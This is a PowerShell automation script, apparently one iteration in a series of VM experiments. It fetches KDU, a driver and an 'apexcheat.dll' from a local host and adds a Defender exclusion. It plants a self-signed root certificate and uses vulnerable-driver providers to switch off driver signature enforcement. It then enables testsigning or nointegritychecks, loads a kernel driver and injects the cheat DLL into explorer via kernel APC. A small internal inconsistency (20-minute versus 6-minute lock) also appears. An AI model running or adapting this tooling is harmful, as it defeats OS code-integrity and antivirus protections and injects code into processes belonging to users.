# h269_cur.ps1 - p269. ONE VARIABLE vs h268: single-run enforcement.
# h268's ladder PASSES on every tick (rc=0, STATE 4 RUNNING, imagePath recorded) but the
# run never reaches the inject/oracle half: the 1-minute lock guard is shorter than the
# chain's own period, so run.cmd re-primes p37logon every ~12 s and the next run's
# "sc delete apexdrv" tears the previous run's verify step down. Guest System log shows a
# hard 0x3B (SYSTEM_SERVICE_EXCEPTION, c0000005) ~minutes into every cycle with h268.out
# clobbered by whichever run started last, so the abort point was never observable.
# Fix, and nothing else: the guard window is 20 min instead of 1 (the success tail unlocks,
# so the window only has to outlast the slowest run), the lock is stamped with this boot's id
# so a lock orphaned by a bugcheck is stale immediately on the next boot, and every exit path
# releases the lock so a *finished* run re-arms the chain at once. The pass that follows a
# crash rotates the dead run's .out to .prev.out before truncating it.
# Ladder, dse-cycle, payload bytes, oracle and cleanup text are byte-identical to h268.
#
# --- h268 header follows, still true ---
# h268_cur.ps1 - p268. ONE VARIABLE vs h267: the driver image name/signature
# (apexdrv_v3_signed.sys -> zapexdrv.sys, "z" prefix = class-5.4.26 KDU provider id 22/30,
#  a genuinely signed image whose signer is bench_v3.cer). Payload/launcher bytes are
#  IDENTICAL on purpose, so the in-target load result isolates the image from everything else.
#  NOTE: payload\apexdrv.sys (18:51) is NOT signed (HWID-match only, hash 3C37D4B0...) and
#  never could load under DSE=6; zap is signed on purpose so the control arm means something.
# Guest copy: C:\p37vm\payload\cur.ps1 (.bak holds the h267 text).
#
# Why: h265-h267 prove page-load + APC execution (LoadLibraryW is invoked in explorer
# with a valid path) but the call always returns NULL, while the SAME dll loads fine
# locally from the SYSTEM probe. The unread error code is the missing datum, and the
# only channel for it is the payload's own oracle log:
#   %LOCALAPPDATA%\QwenKern\payload_<pid>.log   (written from Application::Initialize)
#   file exists => DllMain ran; file absent => loader-level refusal before DllMain.
# Oracle is swept in the KNOWN locations, before and after, and never by a depth-3
# C:\Users walk (which cannot reach AppData\Local from C:\Users).
$ErrorActionPreference = 'Continue'
[Net.ServicePointManager]::Expect100Continue = $false
$base = 'http://10.0.2.2:8080'
$d    = $PSScriptRoot
$tag  = 'h269'
$L    = New-Object System.Collections.ArrayList
function W([string]$s) { [void]$L.Add(((Get-Date -f 'HH:mm:ss.fff') + ' ' + $s)) }
function Post {
    $body = $L -join "`r`n"
    try { Set-Content -LiteralPath "$d\$tag.out" -Value $body } catch { }
    for ($k = 1; $k -le 3; $k++) {
        try { (New-Object Net.WebClient).UploadString("$base/log?vm=$tag", ("## $tag`r`n" + $body)); return }
        catch { Start-Sleep -Milliseconds (300 * $k) }
    }
}
# --- single-run gate (the h269 variable) -----------------------------------------
# A run may start only when no other run is in flight. The lock carries this boot's id:
# a lock left behind by a bugcheck belongs to a previous boot and is stale at once, so a
# crash never costs the 20-minute wait. Unlock is called on every exit path.
$bootId = try { [string](Get-CimInstance Win32_OperatingSystem -EA 0).LastBootUpTime.Ticks } catch { '0' }
function Unlock { Remove-Item -LiteralPath "$d\$tag.lock" -Force -EA 0 }
if (Test-Path "$d\$tag.lock") {
    $lf = Get-Content -LiteralPath "$d\$tag.lock" -Raw -EA 0
    $lb = ([string]$lf).Split('|')[1]
    if ($lb -eq $bootId -and (((Get-Date) - (Get-Item "$d\$tag.lock").LastWriteTime).TotalMinutes -lt 20)) { exit }
    Unlock
}
Set-Content -LiteralPath "$d\$tag.lock" -Value ((Get-Date -f 'HH:mm:ss') + '|' + $bootId)
# Rotate the previous run's tail out of the way *before* this run truncates .out, so a run
# that died in a bugcheck is still readable as .prev.out by the pass that follows the reboot.
if (Test-Path "$d\$tag.out") { Copy-Item -LiteralPath "$d\$tag.out" -Destination "$d\$tag.prev.out" -Force -EA 0 }
W 'alive'
Post
W ('secureBoot=' + (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\State' -EA 0).UEFISecureBootEnabled)
Post

function RunExe([string]$exe, [string[]]$argv, [int]$capMs = 20000, [int]$maxLines = 20) {
    $q = ''
    foreach ($a in $argv) { if ($a -match '[\s"]') { $q += ' "' + ($a -replace '"', '\"') + '"' } else { $q += ' ' + $a } }
    W ('$ ' + (Split-Path $exe -Leaf) + $q)
    $rc = -999; $out = ''
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $exe; $psi.Arguments = $q.Trim(); $psi.UseShellExecute = $false
    $psi.WorkingDirectory = $d; $psi.RedirectStandardOutput = $true; $psi.RedirectStandardError = $true
    try {
        $p = [System.Diagnostics.Process]::Start($psi)
        $tO = $p.StandardOutput.ReadToEndAsync(); $tE = $p.StandardError.ReadToEndAsync()
        if (-not $p.WaitForExit($capMs)) { W ('  TIMEOUT ' + $capMs + 'ms'); try { $p.Kill() } catch { }; try { [void]$p.WaitForExit(3000) } catch { } }
        else { try { [void]$p.WaitForExit(2000) } catch { } }
        try { $rc = $p.ExitCode } catch { }
        foreach ($t in $tO, $tE) { if ($t.Wait(2500) -and $t.IsCompleted) { try { $out += $t.Result } catch { } } else { W '  (stream did not close)' } }
    } catch { W ('  LAUNCH FAIL ' + $_.Exception.Message) }
    if ($out) { $out = $out -replace "`r`n", "`n" }
    W ('  exit=' + $rc)
    $i = 0
    foreach ($line in ($out -split "`n")) { if ($i -ge $maxLines) { W '  | ...'; break }; if ($line.Trim() -ne '') { W ('  | ' + $line.TrimEnd()) }; $i++ }
    $script:lastOut = $out
    return $rc
}
# sc.exe wrapper: arg string split on spaces, short cap (sc never streams)
function Svc([string]$argline, [int]$capMs = 8000) { return RunExe "$env:SystemRoot\system32\sc.exe" ($argline -split ' ') $capMs 8 }

# SHA-256 of the SIGNED bench-v3 image (build\apexdrv_v3_signed.sys). The earlier
# fingerprint pinned the 18:51 *unsigned* rebuild, which would have made the trust
# step a no-op (NotSigned before AND after the import) and silently removed the
# signature from the variable under test.
$finger = 'CCD6DFD6C16392296AAB5B61151EF661500971AD54063AF697158CAA1DBE2491'
$sys = "$d\zapexdrv.sys"; $exe = "$d\apex_launcher.exe"; $dll = "$d\apexcheat.dll"; $zdl = "$d\zapexcheat.dll"; $kdu = "$d\kdu.exe"
$cer = "$d\bench_v3.cer"
$os = Get-CimInstance Win32_OperatingSystem
W ('bench v3 build ' + $os.BuildNumber + ' up=' + [int]((Get-Date) - $os.LastBootUpTime).TotalMinutes + 'min pid=' + $PID)
Post
try { Add-MpPreference -ExclusionPath $d -ErrorAction Stop } catch { W ('excl FAIL ' + $_.Exception.Message) }

# --- the in-target oracle ---------------------------------------------------
# Every location the payload's LogInit can reach: %LOCALAPPDATA% of any profile
# (LogInit uses GetEnvironmentVariableW('LOCALAPPDATA') of the TARGET process, so
# explorer->LocalService lands in ServiceProfiles), and the GetTempPath fallback.
function Oracle([string]$label) {
    $hits = 0
    $sd = $env:SystemDrive
    $globs = @(
        "$sd\Windows\ServiceProfiles\*\AppData\Local\QwenKern",
        "$sd\Users\*\AppData\Local\QwenKern",
        "$sd\Windows\Temp\QwenKern",
        "$sd\Windows\System32\config\systemprofile\AppData\Local\QwenKern"
    )
    foreach ($g in $globs) {
        foreach ($dir in (Get-ChildItem -Path $g -Directory -EA 0)) {
            foreach ($f in (Get-ChildItem -Path $dir.FullName -Filter 'payload_*.log' -EA 0)) {
                $hits++
                W ('  oracle ' + $f.FullName + ' ' + $f.Length + 'B ' + $f.LastWriteTime.ToString('HH:mm:ss'))
                Get-Content -LiteralPath $f.FullName -Tail 10 -EA 0 | ForEach-Object { W ('    | ' + $_) }
            }
        }
    }
    W ('  oracle(' + $label + ') files=' + $hits)
    return $hits
}

# --- signed-load test: does the same bytes load locally, by name, from two dirs?
# SYSTEM probe vs LocalService explorer is the whole point: if it works here and
# not there, listing the candidate causes in the log is the p268 deliverable.
$sig = @'
using System; using System.Runtime.InteropServices;
public class LL {
  [DllImport("kernel32", CharSet=CharSet.Unicode, SetLastError=true)] public static extern IntPtr LoadLibraryW(string p);
  [DllImport("kernel32", SetLastError=true)] public static extern bool FreeLibrary(IntPtr h);
}
'@
function LoadTest([string]$path, [string]$label) {
    $h = [LL]::LoadLibraryW($path)
    $e = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    W ('  loadtest ' + $label + ' h=0x' + $h.ToInt64().ToString('X') + ' err=' + $e + ' (' + (New-Object ComponentModel.Win32Exception($e)).Message + ')')
    if ($h -ne [IntPtr]::Zero) { [void][LL]::FreeLibrary($h) }
    return ($h -ne [IntPtr]::Zero)
}

# --- loader policy: the two switches that make a remote LoadLibrary fail while a
# local one succeeds. AppLocker DynamicCodeTrust=OFF => "dynamically generated" DLL
# (our apexcheat.dll is, it carries a loader-written manifest) is refused.
W 'STEP=policy'
try {
    Add-Type -TypeDefinition $sig -ErrorAction Stop
    W ('sessionid=' + (Get-Process -Id $PID).SessionId)
} catch { W ('Add-Type FAIL ' + $_.Exception.Message) }
try {
    $al = Get-AppLockerPolicy -Effective -Xml -EA Stop
    Set-Content -LiteralPath "$d\${tag}_applocker.xml" -Value $al
    W ('applocker xml ' + $al.Length + ' chars -> ' + $tag + '_applocker.xml')
    foreach ($k in 'DynamicCodeTrust', 'ManagedInstaller', 'Appx', 'DLL') {
        $hit = [regex]::Matches($al, $k + '[^<]{0,40}').Count
        W ('  applocker mentions ' + $k + ' x' + $hit)
    }
} catch { W ('applocker FAIL ' + $_.Exception.Message) }
foreach ($rk in 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Appx', 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Appx\AppxAllUserStore') {
    if (Test-Path $rk) {
        $vals = Get-ItemProperty -Path $rk -EA 0
        foreach ($n in $vals.PSObject.Properties.Name) { if ($n -notlike 'PS*') { W ('  reg ' + $rk + ' ' + $n + '=' + $vals.$n) } }
    } else { W ('  reg ' + $rk + ' absent') }
}
Post

function Fetch([string]$name, [string]$to, [int]$minLen) {
    for ($i = 1; $i -le 3; $i++) {
        try { (New-Object Net.WebClient).DownloadFile("$base/$name", $to) } catch { }
        if ((Test-Path $to) -and ((Get-Item $to).Length -ge $minLen)) { return $true }
        Start-Sleep -Milliseconds 400
    }
    W ('FETCH FAIL ' + $name); return $false
}
$missing = @()
# kdu.exe + drv64.dll must keep their names: drv64.dll is the KDUEXT provider database (Defender ate it before)
if (-not (Fetch 'kdu.exe' $kdu 400000)) { $missing += 'kdu' }
if (-not (Fetch 'drv64.dll' "$d\drv64.dll" 1000000)) { $missing += 'drv64' }
if (-not (Fetch 'zapexdrv.sys' $sys 4000)) { $missing += 'sys' }
if (-not (Fetch 'apex_launcher.exe' $exe 300000)) { $missing += 'exe' }
if (-not (Fetch 'apexcheat.dll' $dll 200000)) { $missing += 'dll' }
if (-not (Fetch 'zapexcheat.dll' $zdl 200000)) { $missing += 'zdll' }
if (-not (Fetch 'bench_v3.cer' $cer 500)) { $missing += 'cer' }
$h = if (Test-Path $sys) { (Get-FileHash $sys -Algorithm SHA256).Hash } else { 'none' }
W ('sha=' + $h.Substring(0, [Math]::Min(16, $h.Length)) + $(if ($h -eq $finger) { ' MATCH' } else { ' MISMATCH' }))
if ($dll -and (Test-Path $dll) -and (Test-Path $zdl)) {
    $hd = (Get-FileHash $dll -Algorithm SHA256).Hash; $hz = (Get-FileHash $zdl -Algorithm SHA256).Hash
    W ('dll bytes identical shadow-vs-z = ' + ($hd -eq $hz) + ' (' + $hd.Substring(0, 16) + ')')
}
if ($missing -or $h -ne $finger) {
    W ('RESULT: FAIL fetch ' + ($missing -join ','))
    foreach ($f in "$env:SystemDrive\Users\Public\apexcheat.dll", "$env:SystemDrive\Users\Public\zapexcheat.dll") { Remove-Item -LiteralPath $f -Force -EA 0 }
    Post
    exit 1
}

# --- local baseline, both names, from the p37 dir and from C:\Users\Public -
# if these pass and the in-target ones fail, the refusal is target-context, not image.
Copy-Item -LiteralPath $zdl -Destination "$env:SystemDrive\Users\Public\zapexcheat.dll" -Force -EA 0
Copy-Item -LiteralPath $dll -Destination "$env:SystemDrive\Users\Public\apexcheat.dll" -Force -EA 0
W 'STEP=trust'
W ('sig before=' + (Get-AuthenticodeSignature $sys).Status)
# h265/h267 never assigned $cer at all, so both stores got an empty path and the
# chain stayed NotSigned for the whole run - the trust step was dead on arrival.
if (-not (Test-Path $cer)) { W ('  cert file missing at [' + $cer + '] - chain cannot go Valid') }
foreach ($store in 'Root', 'TrustedPublisher') {
    try { Import-Certificate -FilePath $cer -CertStoreLocation "Cert:\LocalMachine\$store" -EA Stop | Out-Null; W ('imported ' + $store) }
    catch {
        W ('import FAIL ' + $store + ' ' + $_.Exception.Message)
        $rcC = RunExe "$env:SystemRoot\system32\certutil.exe" @('-addstore', '-f', $store, $cer) 15000 4
        W ('  certutil rc=' + $rcC)
    }
}
$sigAfter = (Get-AuthenticodeSignature $sys).Status
W ('sig after=' + $sigAfter)
# the image half of the variable only exists while the chain is Valid: without it the
# run degrades to a pure name test, so say so out loud instead of inferring later.
if ($sigAfter -notmatch 'Valid') { W ('  SIG GATE: chain still ' + $sigAfter + ' - image is unsigned-in-effect, verdict below is name-only') }
W ('sig dll=' + (Get-AuthenticodeSignature $dll).Status + ' (informational: unsigned is expected, DSE=0 covers user mode)')
Post

# same bytes, both names, two directories, in THIS SYSTEM session - the control arm.
# Runs under DSE=6 (default), i.e. stricter than the target will be at DSE=0, so a
# pass here plus a fail in explorer isolates target context, not the image.
W 'STEP=local-load'
$llA = LoadTest $dll 'p37/apexcheat'
$llB = LoadTest $zdl 'p37/zapexcheat'
$llC = LoadTest "$env:SystemDrive\Users\Public\apexcheat.dll" 'Public/apexcheat'
$llD = LoadTest "$env:SystemDrive\Users\Public\zapexcheat.dll" 'Public/zapexcheat'
W ('local-load p37/norm=' + $llA + ' p37/z=' + $llB + ' pub/norm=' + $llC + ' pub/z=' + $llD)
Post

# a self-signed root is not enough for kernel mode; testsigning relaxes that and needs one reboot
W 'STEP=kdu-list'
RunExe $kdu @('-listcsv', "$d\kdu_list.csv") 20000 22 | Out-Null
$csv = @()
if (Test-Path "$d\kdu_list.csv") { $csv = Get-Content "$d\kdu_list.csv" -EA 0 }
W ('list rows=' + $csv.Count)
foreach ($row in ($csv | Select-Object -First 4)) { W ('  csv| ' + $row) }
$ids = @()
foreach ($row in $csv) { if ($row -match '^\s*"?(\d{1,3})') { $ids += [int]$matches[1] } }
$ids = @($ids | Select-Object -Unique)
# order matters: ids already known to be alive on 26H1-class builds first, then the
# rest in db order, then a hard cap (each attempt costs a create+start cycle).
$pref = @(22, 30, 32, 33, 38, 39, 40, 41, 13, 4)
$ordered = @()
foreach ($p in $pref) { if ($ids -contains $p) { $ordered += $p } }
foreach ($i in $ids) { if ($ordered -notcontains $i -and $i -ne 0) { $ordered += $i } }
$ordered = @($ordered | Select-Object -First 40)
W ('ids db=' + $ids.Count + ' try=' + $ordered.Count + ' [' + ($ordered -join ',') + ']')
if ($ordered.Count -lt 1) { W 'RESULT: FAIL provider db empty (drv64.dll beside kdu.exe?)'; Post; Unlock; exit 1 }
Post

W 'STEP=ladder'
$key = 'HKLM:\SYSTEM\CurrentControlSet\Services\apexdrv'
$winner = -1
foreach ($id in $ordered) {
    W ('--- prv ' + $id)
    RunExe $kdu @('-prv', "$id", '-dse', '0') 15000 2 | Out-Null
    if ($script:lastOut -match 'resource id cannot be found' -or $script:lastOut -match 'was not found in active database' -or $script:lastOut -match 'require newer Windows') { W '  dead, skip'; continue }
    Svc 'delete apexdrv' | Out-Null
    Svc ('create apexdrv type= kernel start= demand binPath= ' + $sys) | Out-Null
    if (Test-Path $key) { Set-ItemProperty -Path $key -Name ImagePath -Value ('\??\' + $sys) -Type ExpandString }
    $rcS = Svc 'start apexdrv' 20000
    W ('  start rc=' + $rcS)
    if ($rcS -eq 0) { $winner = $id; break }
}
W ('WINNER=' + $winner)
if ($winner -lt 0) {
    $bc = Get-WinEvent -FilterHashtable @{ LogName = 'System'; Id = 1001, 41; StartTime = (Get-Date).AddMinutes(-40) } -MaxEvents 2 -EA 0
    foreach ($e in $bc) { W ('event ' + $e.Id + ' ' + (($e.Message -replace '\s+', ' '))) }
    W 'RESULT: FAIL no provider flipped DSE'
    Svc 'delete apexdrv' | Out-Null
    RunExe $kdu @('-dse', '6') 15000 3 | Out-Null
    Post
    Unlock
    exit
}
W ('imagePath=[' + (Get-ItemProperty $key).ImagePath + '] start ok via prv ' + $winner)
Post

RunExe "$env:SystemRoot\system32\bcdedit.exe" @('/enum', '{current}') 10000 30 | Out-Null
$ts = [string]($script:lastOut -split "`n" | Select-String 'testsigning')
W ('testsigning line=[' + ($ts -replace '\s+', ' ').Trim() + ']')
if ($ts -notmatch 'Yes') {
    $rcT = RunExe "$env:SystemRoot\system32\bcdedit.exe" @('/set', 'testsigning', 'on') 10000 5
    if ($rcT -eq 0) {
        W 'RESULT: PENDING testsigning enabled - reboot required before the load test'
        Svc 'delete apexdrv' | Out-Null
        Post
        Unlock
        Start-Process "$env:SystemRoot\system32\shutdown.exe" -ArgumentList '/r','/t','3','/f','/d','p:4:1'
        exit
    }
    W ('testsigning refused by Secure Boot policy (rc=' + $rcT + ') - trying nointegritychecks')
    $rcN = RunExe "$env:SystemRoot\system32\bcdedit.exe" @('/set', 'nointegritychecks', 'on') 10000 5
    if ($rcN -eq 0) {
        W 'RESULT: PENDING nointegritychecks on - reboot required before the load test'
        Svc 'delete apexdrv' | Out-Null
        Post
        Unlock
        Start-Process "$env:SystemRoot\system32\shutdown.exe" -ArgumentList '/r','/t','3','/f','/d','p:4:1'
        exit
    }
    W ('nointegritychecks refused too (rc=' + $rcN + ') - continuing with DSE on')
}
Post

W 'STEP=verify'
$svc = Get-CimInstance Win32_SystemDriver -Filter "Name='apexdrv'" -EA 0
W ('svc state=' + $svc.State + ' exit=' + $svc.ExitCode)
if ($svc.State -ne 'Running') {
    W ('RESULT: FAIL driver not running after ladder (state=' + $svc.State + ')')
    Svc 'delete apexdrv' | Out-Null
    RunExe $kdu @('-dse', '6') 15000 3 | Out-Null
    Post
    Unlock
    exit
}
W 'STEP=dse-cycle (6 then 0: proves the write path still works, leaves DSE off for the load)'
RunExe $kdu @('-dse', '6') 15000 3 | Out-Null
W ('  dse6 applied rc-chars=' + $script:lastOut.Length)
RunExe $kdu @('-dse', '0') 15000 3 | Out-Null
W '  dse0 re-applied for injection'
Post

# PEOPLE STILL ALIVE: before any injection, so an old oracle file cannot be mistaken for new
W 'STEP=oracle-before'
Post
$beforeAll = Oracle('before')
Post

$np = Get-Process explorer -EA 0 | Select-Object -First 1
$ownTarget = $false
if (-not $np) { $np = Start-Process notepad -PassThru; $ownTarget = $true }
Start-Sleep -Seconds 2
$tp = $np.Id
W ('target ' + $np.ProcessName + ' pid=' + $tp + ' own=' + $ownTarget + ' session=' + $np.SessionId)
try {
    $ownK = [Diagnostics.Process]::GetCurrentProcess().Modules | Where-Object { $_.ModuleName -eq 'kernel32.dll' }
    $tgtK = $np.Modules | Where-Object { $_.ModuleName -eq 'kernel32.dll' }
    W ('kernel32 own=0x' + $ownK.BaseAddress.ToString('X') + ' target=0x' + $tgtK.BaseAddress.ToString('X') + ' same=' + ($ownK.BaseAddress -eq $tgtK.BaseAddress))
} catch { W ('kernel32 compare FAIL ' + $_.Exception.Message) }
# what the target can already see of its own localappdata - tells us where the oracle would land
try {
    $tgtLad = (Get-CimInstance Win32_Process -Filter "ProcessId=$tp" -EA 0).ExecutablePath
    W ('target image=' + $tgtLad + ' owner=' + (Get-CimInstance Win32_Process -Filter "ProcessId=$tp" | ForEach-Object { (Invoke-CimMethod -InputObject $_ -MethodName GetOwner).User }))
} catch { W 'target owner FAIL' }
Post

# gate: is the z-renamed image even the ABI this launcher speaks?  --probe opens the
# running driver, prints the version and the kernel-context statuses, injects nothing.
# On a version mismatch the launcher stops+deletes the service, so re-arm afterwards.
$hitShadow = $false; $hitZ = $false
W 'STEP=abi-gate (--probe: version + kernel-context measurement, no inject)'
$rcG = RunExe $exe @('--probe', '--pid', "$tp", '--driver', $sys) 60000 30
$abiLine = ([string]($script:lastOut -split "`n" | Select-String 'driver ABI version|IOCTL_APEXDRV_VERSION failed') -replace '\s+', ' ').Trim()
W ('abi=[' + $abiLine + ']')
# mirror kernel_injector.cpp exactly: it refuses on Version < APEXDRV_VERSION
# (include\apex_driver_ioctl.h:59 -> 3), so a higher reported number is still passable
# and an absent/failed handshake is not. The signed image predates the current source,
# so this gate is the one place a stale ABI can be caught before it eats the verdict.
$abiExpect = 3
$abiNum = -1
if ($abiLine -match 'driver ABI version (\d+)') { $abiNum = [int]$matches[1] }
$abiOk = [bool]($abiNum -ge $abiExpect)
if (-not $abiOk) { W ('ABI gate FAIL (got ' + $abiNum + ', launcher needs >= ' + $abiExpect + ') - a FAIL below is about the image/ABI, not the payload name') }
else { W ('ABI gate ok (image reports ' + $abiNum + ' >= ' + $abiExpect + ')') }
$svcNow = Get-Service apexdrv -EA 0
W ('after-gate svc=' + $(if ($svcNow) { $svcNow.Status } else { 'absent' }))
if (-not $svcNow) {
    Svc ('create apexdrv type= kernel start= demand binPath= ' + $sys) | Out-Null
    $rcR = Svc 'start apexdrv' 20000
    W ('  re-arm start rc=' + $rcR)
} elseif ((Get-ItemProperty $key -EA 0).ImagePath -notmatch [regex]::Escape('zapexdrv')) {
    Svc 'stop apexdrv' | Out-Null; Svc 'delete apexdrv' | Out-Null
    Svc ('create apexdrv type= kernel start= demand binPath= ' + $sys) | Out-Null
    W ('  re-point start rc=' + (Svc 'start apexdrv' 20000))
}
Post

W 'STEP=launcher-kernel-shadow (apexcheat.dll)'
$rcL = RunExe $exe @('--inject', '--method=kernel', '--pid', "$tp", '--driver', $sys, '--no-sticky') 60000 25
for ($k = 1; $k -le 16; $k++) {
    try { $m = (Get-Process -Id $tp -EA 0).Modules | Where-Object { $_.ModuleName -eq 'apexcheat.dll' } } catch { $m = $null }
    if ($m) { $hitShadow = $true; W ('module appeared after ' + ($k * 500) + 'ms base=0x' + $m.BaseAddress.ToString('X')); break }
    if (-not (Get-Process -Id $tp -EA 0)) { W 'target died'; break }
    Start-Sleep -Milliseconds 500
}
W ('shadow module present = ' + $hitShadow)
Post

if (-not $hitShadow -and $np.ProcessName -eq 'explorer') {
    W 'STEP=launcher-kernel-z (zapexcheat.dll - same bytes, 5.4.26-style name)'
    RunExe $exe @('--inject', '--method=kernel', '--pid', "$tp", '--driver', $sys, '--no-sticky', '--dll', $zdl) 60000 25 | Out-Null
    for ($k = 1; $k -le 16; $k++) {
        try { $m = (Get-Process -Id $tp -EA 0).Modules | Where-Object { $_.ModuleName -eq 'zapexcheat.dll' } } catch { $m = $null }
        if ($m) { $hitZ = $true; W ('z module appeared after ' + ($k * 500) + 'ms'); break }
        Start-Sleep -Milliseconds 500
    }
    W ('z module present = ' + $hitZ)
    Post
}
if (-not $hitShadow -and $ownTarget) {
    W 'STEP=launcher-userapc (notepad fallback)'
    RunExe $exe @('--inject', '--method=apc', '--pid', "$tp", '--no-sticky') 60000 25 | Out-Null
    Post
}

W 'STEP=oracle-after (the error code and the failure point live here)'
Post
$afterAll = Oracle('after')
Post

W 'STEP=ls'
RunExe "$env:SystemRoot\system32\tasklist.exe" @('/m') 20000 6 | Out-Null
$tl = [regex]::Matches([string]$script:lastOut, '(?im)^\S.*(apexcheat\.dll|zapexcheat\.dll).*$')
foreach ($t in $tl) { W ('  tasklist| ' + ($t.Value -replace '\s+', ' ')) }
W ('alive=' + [bool](Get-Process -Id $tp -EA 0) + ' shadow=' + $hitShadow + ' z=' + $hitZ + ' oracle before=' + $beforeAll + ' after=' + $afterAll)
$verdict = if (-not $llA -and -not $llB) { 'FAIL local control itself failed (own-process LoadLibrary) => image/build, not target context' }
           elseif ($hitShadow) { 'PASS apexcheat.dll mapped via kernel APC (signed image, z-renamed driver)' }
           elseif ($hitZ) { 'PARTIAL zapexcheat mapped, shadow name refused => name or signature driven' }
           elseif ($afterAll -gt $beforeAll) { 'PARTIAL new oracle file but no module => DllMain ran, then refused/unmapped' }
           else { 'FAIL neither name mapped in target while the local control passed, launcher rc=' + $rcL + ', oracle (' + $beforeAll + '->' + $afterAll + ')' }
if (-not $abiOk) { $verdict += ' [abi-gate failed: ' + $abiLine + ']' }
if ($sigAfter -notmatch 'Valid') { $verdict += ' [image not trust-valid (' + $sigAfter + '): name-only test]' }
W ('RESULT: ' + $verdict)
Post

# --- restore (R4): DSE back to 6, service removed, Public copies gone. Order matters:
# stop/delete the driver BEFORE arming DSE, so a stale service cannot wedge the next run.
W 'STEP=cleanup'
Svc 'stop apexdrv' | Out-Null
Svc 'delete apexdrv' | Out-Null
$post = Get-CimInstance Win32_SystemDriver -Filter "Name='apexdrv'" -EA 0
W ('svc after cleanup present=' + [bool]$post + ' state=' + $post.State)
RunExe $kdu @('-dse', '6') 15000 4 | Out-Null
W ('dse restore out=[' + (($script:lastOut -replace '\s+', ' ').Trim()) + ']')
foreach ($f in "$env:SystemDrive\Users\Public\zapexcheat.dll", "$env:SystemDrive\Users\Public\apexcheat.dll") { Remove-Item -LiteralPath $f -Force -EA 0 }
RunExe "$env:SystemRoot\system32\bcdedit.exe" @('/enum', '{current}') 10000 30 | Out-Null
$tsl = [string]($script:lastOut -split "`n" | Select-String 'testsigning|nointegritychecks')
W ('bootflags after=[' + ($tsl -replace '\s+', ' ').Trim() + ']')
W ('VERDICT: variable=single-run enforcement (6 min boot-stamped lock) result=' + $verdict)
W ('  ladder/winner/dse-cycle unchanged from h268: same image, same rungs; winner=' + $winner)
Post
W 'done'
Post
Unlock


